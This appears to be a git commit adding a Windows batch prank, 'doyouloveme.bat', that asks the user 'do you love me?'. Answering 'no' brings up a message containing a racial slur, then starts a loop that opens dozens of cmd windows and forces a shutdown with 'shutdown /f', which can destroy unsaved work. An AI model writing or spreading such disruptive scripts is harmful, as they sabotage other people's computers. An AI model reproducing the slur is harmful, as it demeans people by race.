30d0445f41d5b54fa6846163e187157861a32183
freefellas1233321 <168291566+freefellas1233321@users.noreply.github.com>
2024-04-27 18:05:54 +0200

    Add files via upload

---
+++ doyouloveme.bat
@@ -0,0 +1,54 @@
+@echo off
+set /p choice=do you love me? (yes/no): 
+if /i "%choice%"=="yes" (
+start curl ascii.live
+msg * "thanks <3"
+exit
+) else if /i "%choice%"=="no" ( 
+msg * "then fuck off nigga"
+:a
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+timeout 10
+shutdown /f
+goto a
+) else (
+    echo Invalid choice. Please select Yes or No.
+)
+exit
